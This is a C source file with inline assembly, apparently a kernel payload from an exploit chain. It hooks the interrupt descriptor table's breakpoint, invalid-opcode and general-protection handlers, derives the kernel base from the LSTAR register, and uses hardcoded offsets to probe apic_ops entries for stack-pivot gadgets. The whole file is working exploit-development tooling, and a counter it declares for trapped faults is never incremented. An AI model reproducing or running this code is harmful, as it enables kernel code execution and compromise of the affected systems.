#include <stdint.h>

/*
 * pivot_scan_safe v4 — IDT-hooked pivot gadget scanner
 *
 * v1-v3: pcb_onfault only catches #PF. Executing arbitrary ktext bytes
 * triggers #UD/#GP/#BP → kernel panic. Each bad candidate = full reboot.
 *
 * v4 fix: Hook IDT vectors 3 (#BP), 6 (#UD), 13 (#GP) with custom
 * handlers that check pcb_onfault — same as the kernel's #PF handler.
 * Now ALL exceptions during probing are caught. Zero panics.
 *
 * Flow:
 *   1. sidt → get IDT base
 *   2. Save original gate descriptors for vectors 3, 6, 13
 *   3. Install our handlers (in payload's executable memory)
 *   4. Batch probe all apic_ops entries at delta -1 through -8
 *   5. Restore original IDT entries
 *   6. Report results
 *
 * fw_ver encoding:
 *   Bits [7:0]   = start apic_ops index (0-27, for resume)
 *   Bits [15:8]  = max delta (1-8, default 8 if 0)
 *   Bits [31:16] = reserved
 *
 * Output layout (uint64_t indices):
 *   [0]   magic "PVS4" (0x50565334) | status(32)
 *   [1]   kdata_base
 *   [2]   ktext_base
 *   [3]   td_pcb
 *   [4]   idt_base
 *   [5]   num_candidates
 *   [6]   num_tested
 *   [7]   num_survived (normal return, no pivot)
 *   [8]   num_faulted  (pcb_onfault caught: #PF)
 *   [9]   num_trapped  (IDT hook caught: #UD/#BP/#GP)
 *   [10]  num_pivots
 *   [11]  first pivot ktext offset
 *   [12]  first pivot absolute address
 *   [13]  current apic_ops index (live)
 *   [14]  current delta (live)
 *   [15]  current candidate addr (live)
 *   [16..47] per-entry results for apic_ops[0..27]:
 *            bit 0: tested at delta-1
 *            bit 1: tested at delta-2
 *            ...
 *            bit 7: tested at delta-8
 *            bits 8-15: result for each delta (0=survived, 1=pivot, 2=#PF, 3=trap)
 *            bits 48-63: apic_ops index
 *   [48..55] pivot details (up to 4): [off, addr] pairs
 *   [63]  sentinel
 */

#define MAGIC_PVS4    0x50565334
#define TD_PCB        0x3f8
#define PCB_ONFAULT   0x108

#define OFF_NOP_RET        (-0x9d20ca)
#define APIC_OPS_OFF_KTEXT  0x1934AC8
#define NUM_APIC_OPS        28

#define ENTRY_STK_SIZE    32
#define MAX_PIVOTS        4

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

/* x86-64 IDT gate descriptor (16 bytes) */
typedef struct {
    uint16_t off_lo;    /* offset bits 0-15 */
    uint16_t selector;  /* code segment selector */
    uint8_t  ist;       /* IST index (bits 0-2), reserved (bits 3-7) */
    uint8_t  flags;     /* type(4), S=0(1), DPL(2), P(1) */
    uint16_t off_mid;   /* offset bits 16-31 */
    uint32_t off_hi;    /* offset bits 32-63 */
    uint32_t reserved;
} __attribute__((packed)) idt_gate_t;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read8(uint64_t addr)
{
    return *(volatile uint64_t*)addr;
}

static inline void write8(uint64_t addr, uint64_t val)
{
    *(volatile uint64_t*)addr = val;
}

static uint64_t idt_gate_get_offset(idt_gate_t* g)
{
    return (uint64_t)g->off_lo
         | ((uint64_t)g->off_mid << 16)
         | ((uint64_t)g->off_hi << 32);
}

static void idt_gate_set_offset(idt_gate_t* g, uint64_t addr)
{
    g->off_lo  = (uint16_t)(addr);
    g->off_mid = (uint16_t)(addr >> 16);
    g->off_hi  = (uint32_t)(addr >> 32);
}

/* ---- Shared state ---- */
static volatile uint64_t saved_rsp;
static volatile uint64_t onfault_ptr;
static volatile int probe_result;

static volatile uint64_t pivot_chain[8];
static volatile uint64_t entry_stk[ENTRY_STK_SIZE];

/* Original IDT handler addresses (for passthrough) */
static volatile uint64_t orig_handler_bp;
static volatile uint64_t orig_handler_ud;
static volatile uint64_t orig_handler_gp;

/* ---- Pivot landing (reached when RSP redirected to pivot_chain) ---- */
__attribute__((naked, used))
static void pivot_landing(void)
{
    __asm__ volatile(
        "movq $1, probe_result(%%rip)\n\t"
        "movq saved_rsp(%%rip), %%rsp\n\t"
        "movq onfault_ptr(%%rip), %%r14\n\t"
        "movq $0, (%%r14)\n\t"
        "jmp .Lprobe_done\n\t"
        ::: "memory"
    );
}

/*
 * IDT hook handler for #BP (vector 3) and #UD (vector 6).
 * These have NO error code on the stack.
 *
 * Stack on entry (pushed by CPU):
 *   [RSP+0]  = RIP (faulting)
 *   [RSP+8]  = CS
 *   [RSP+16] = RFLAGS
 *   [RSP+24] = RSP (at fault time)
 *   [RSP+32] = SS
 *
 * If pcb_onfault is set: overwrite RIP with onfault addr, iretq.
 * If not set: jump to original handler.
 */
__attribute__((naked, used))
static void hook_handler_bp(void)
{
    __asm__ volatile(
        "pushq %%r14\n\t"
        "pushq %%r15\n\t"
        /* curthread → td_pcb → pcb_onfault */
        "movq %%gs:0, %%r14\n\t"
        "movq 0x3f8(%%r14), %%r14\n\t"     /* td_pcb */
        "movq 0x108(%%r14), %%r15\n\t"     /* pcb_onfault */
        "testq %%r15, %%r15\n\t"
        "jz 1f\n\t"
        /* onfault set: redirect RIP, clear onfault, return */
        "movq %%r15, 16(%%rsp)\n\t"        /* overwrite saved RIP */
        "movq $0, 0x108(%%r14)\n\t"        /* clear pcb_onfault */
        "popq %%r15\n\t"
        "popq %%r14\n\t"
        "iretq\n\t"
        /* onfault not set: passthrough to original */
        "1:\n\t"
        "popq %%r15\n\t"
        "popq %%r14\n\t"
        "jmpq *orig_handler_bp(%%rip)\n\t"
        ::: "memory"
    );
}

__attribute__((naked, used))
static void hook_handler_ud(void)
{
    __asm__ volatile(
        "pushq %%r14\n\t"
        "pushq %%r15\n\t"
        "movq %%gs:0, %%r14\n\t"
        "movq 0x3f8(%%r14), %%r14\n\t"
        "movq 0x108(%%r14), %%r15\n\t"
        "testq %%r15, %%r15\n\t"
        "jz 1f\n\t"
        "movq %%r15, 16(%%rsp)\n\t"
        "movq $0, 0x108(%%r14)\n\t"
        "popq %%r15\n\t"
        "popq %%r14\n\t"
        "iretq\n\t"
        "1:\n\t"
        "popq %%r15\n\t"
        "popq %%r14\n\t"
        "jmpq *orig_handler_ud(%%rip)\n\t"
        ::: "memory"
    );
}

/*
 * IDT hook handler for #GP (vector 13).
 * #GP pushes an error code, so the stack layout is different:
 *   [RSP+0]  = error code
 *   [RSP+8]  = RIP (faulting)
 *   [RSP+16] = CS
 *   [RSP+24] = RFLAGS
 *   [RSP+32] = RSP (at fault time)
 *   [RSP+40] = SS
 */
__attribute__((naked, used))
static void hook_handler_gp(void)
{
    __asm__ volatile(
        "pushq %%r14\n\t"
        "pushq %%r15\n\t"
        /* curthread → td_pcb → pcb_onfault */
        "movq %%gs:0, %%r14\n\t"
        "movq 0x3f8(%%r14), %%r14\n\t"
        "movq 0x108(%%r14), %%r15\n\t"
        "testq %%r15, %%r15\n\t"
        "jz 1f\n\t"
        /* onfault set: redirect RIP (at offset 24: +16 for pushes, +8 for error code) */
        "movq %%r15, 24(%%rsp)\n\t"
        "movq $0, 0x108(%%r14)\n\t"
        "popq %%r15\n\t"
        "popq %%r14\n\t"
        "addq $8, %%rsp\n\t"              /* pop error code */
        "iretq\n\t"
        /* passthrough */
        "1:\n\t"
        "popq %%r15\n\t"
        "popq %%r14\n\t"
        "jmpq *orig_handler_gp(%%rip)\n\t"
        ::: "memory"
    );
}

/* ---- Probe function ---- */
static int do_probe(uint64_t candidate)
{
    entry_stk[0] = candidate;
    probe_result = 0;

    __asm__ volatile(
        "leaq entry_stk(%%rip), %%rdx\n\t"
        "leaq 1f(%%rip), %%rcx\n\t"
        ".set j, 1\n\t"
        ".rept 31\n\t"
        "movq %%rcx, (j*8)(%%rdx)\n\t"
        ".set j, j+1\n\t"
        ".endr\n\t"

        "movq onfault_ptr(%%rip), %%r14\n\t"
        "leaq 2f(%%rip), %%rcx\n\t"
        "movq %%rcx, (%%r14)\n\t"

        "movq %%rsp, saved_rsp(%%rip)\n\t"

        /* RAX = pivot_chain (for xchg rsp,rax detection) */
        "leaq pivot_chain(%%rip), %%rax\n\t"
        /* RBP = pivot_chain too (for leave;ret detection) */
        "leaq pivot_chain(%%rip), %%rbp\n\t"

        "leaq entry_stk(%%rip), %%rsp\n\t"
        "retq\n\t"

        /* Normal return */
        "1:\n\t"
        "movq saved_rsp(%%rip), %%rsp\n\t"
        "movq onfault_ptr(%%rip), %%r14\n\t"
        "movq $0, (%%r14)\n\t"
        "jmp .Lprobe_done\n\t"

        /* Fault recovery (pcb_onfault or IDT hook) */
        "2:\n\t"
        "movq saved_rsp(%%rip), %%rsp\n\t"
        /* Don't clear onfault here — the hook already cleared it */
        "movl $2, probe_result(%%rip)\n\t"

        ".globl .Lprobe_done\n\t"
        ".Lprobe_done:\n\t"
        :
        :
        : "rax", "rbx", "rcx", "rdx", "rsi", "rdi",
          "r8", "r9", "r10", "r11", "r14", "r15",
          "rbp", "memory", "cc"
    );

    return probe_result;
}

int module_start(kproc_args* args)
{
    uint64_t kdata_base = args->kdata_base;
    uint32_t fw_ver = args->fw_ver;
    volatile uint64_t* out = (volatile uint64_t*)args;
    volatile uint32_t* out32 = (volatile uint32_t*)args;

    for (int i = 0; i < 64; i++)
        out[i] = 0;

    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;
    uint64_t nop_ret = kdata_base + OFF_NOP_RET;

    uint64_t curthread;
    __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
    uint64_t td_pcb = read8(curthread + TD_PCB);

    if (!td_pcb) {
        out32[0] = MAGIC_PVS4;
        out32[1] = 0xFF;
        out[63] = 0xdeadbeefcafe0024ULL;
        return 0;
    }

    onfault_ptr = td_pcb + PCB_ONFAULT;

    /* Parse fw_ver */
    uint32_t start_idx = fw_ver & 0xFF;
    uint32_t max_delta = (fw_ver >> 8) & 0xFF;
    if (max_delta == 0) max_delta = 8;
    if (max_delta > 16) max_delta = 16;

    /* ---- Read IDT ---- */
    struct {
        uint16_t limit;
        uint64_t base;
    } __attribute__((packed)) idtr;
    __asm__ volatile("sidt %0" : "=m"(idtr));

    uint64_t idt_base = idtr.base;
    idt_gate_t* idt = (idt_gate_t*)idt_base;

    /* Header */
    out32[0] = MAGIC_PVS4;
    out32[1] = 0xAAAA;
    out[1] = kdata_base;
    out[2] = ktext_base;
    out[3] = td_pcb;
    out[4] = idt_base;

    uint64_t apic_ops_addr = ktext_base + APIC_OPS_OFF_KTEXT;

    /* Set up pivot chain */
    pivot_chain[0] = nop_ret;
    pivot_chain[1] = nop_ret;
    pivot_chain[2] = (uint64_t)pivot_landing;
    pivot_chain[3] = nop_ret;
    pivot_chain[4] = nop_ret;
    pivot_chain[5] = nop_ret;
    pivot_chain[6] = nop_ret;
    pivot_chain[7] = nop_ret;

    /* ---- Save original IDT entries and install hooks ---- */
    idt_gate_t saved_bp, saved_ud, saved_gp;

    /* Vector 3: #BP */
    saved_bp = idt[3];
    orig_handler_bp = idt_gate_get_offset(&idt[3]);
    idt_gate_t new_bp = saved_bp;
    idt_gate_set_offset(&new_bp, (uint64_t)hook_handler_bp);
    new_bp.ist = (new_bp.ist & 0xF8); /* clear IST — use current stack */
    idt[3] = new_bp;

    /* Vector 6: #UD */
    saved_ud = idt[6];
    orig_handler_ud = idt_gate_get_offset(&idt[6]);
    idt_gate_t new_ud = saved_ud;
    idt_gate_set_offset(&new_ud, (uint64_t)hook_handler_ud);
    new_ud.ist = (new_ud.ist & 0xF8);
    idt[6] = new_ud;

    /* Vector 13: #GP */
    saved_gp = idt[13];
    orig_handler_gp = idt_gate_get_offset(&idt[13]);
    idt_gate_t new_gp = saved_gp;
    idt_gate_set_offset(&new_gp, (uint64_t)hook_handler_gp);
    new_gp.ist = (new_gp.ist & 0xF8);
    idt[13] = new_gp;

    /* ---- Batch probe ---- */
    uint32_t num_tested = 0;
    uint32_t num_survived = 0;
    uint32_t num_faulted = 0;
    uint32_t num_trapped = 0;  /* caught by IDT hooks (was #UD/#BP/#GP) */
    uint32_t num_pivots = 0;

    uint32_t total_candidates = 0;
    for (uint32_t i = start_idx; i < NUM_APIC_OPS; i++)
        total_candidates += max_delta;
    out[5] = total_candidates;

    for (uint32_t i = start_idx; i < NUM_APIC_OPS; i++) {
        uint64_t func_addr = read8(apic_ops_addr + i * 8);
        if (func_addr < ktext_base || func_addr > ktext_base + 0x2000000)
            continue;

        uint64_t entry_results = ((uint64_t)i << 48);

        for (uint32_t d = 1; d <= max_delta; d++) {
            uint64_t candidate = func_addr - d;

            /* Live progress */
            out[6]  = num_tested + 1;
            out[13] = i;
            out[14] = d;
            out[15] = candidate;

            int result = do_probe(candidate);
            num_tested++;

            /* Encode per-delta result in entry_results */
            entry_results |= (1ULL << (d - 1));           /* tested bit */
            entry_results |= ((uint64_t)(result & 0x3) << (8 + (d - 1) * 2));

            if (result == 1) {
                /* PIVOT FOUND */
                if (num_pivots < MAX_PIVOTS) {
                    out[48 + num_pivots * 2]     = candidate - ktext_base;
                    out[48 + num_pivots * 2 + 1] = candidate;
                }
                if (num_pivots == 0) {
                    out[11] = candidate - ktext_base;
                    out[12] = candidate;
                }
                num_pivots++;
            } else if (result == 2) {
                /*
                 * pcb_onfault fired — could be #PF (kernel handler)
                 * or #UD/#BP/#GP (our IDT hook). Both go to label 2.
                 * We count them together as "faulted/trapped".
                 */
                num_faulted++;
            } else {
                num_survived++;
            }
        }

        /* Store per-entry results */
        if (i < 28)
            out[16 + i] = entry_results;

        /* Update counters */
        out[7] = num_survived;
        out[8] = num_faulted;
        out[9] = num_trapped;
        out[10] = num_pivots;
    }

    /* ---- Restore original IDT entries ---- */
    idt[3]  = saved_bp;
    idt[6]  = saved_ud;
    idt[13] = saved_gp;

    /* Final stats */
    out[6]  = num_tested;
    out[7]  = num_survived;
    out[8]  = num_faulted;
    out[9]  = num_trapped;
    out[10] = num_pivots;

    out32[1] = (num_pivots > 0) ? 0x0002 : 0x0001;
    out[63] = 0xdeadbeefcafe0024ULL;
    return 0;
}
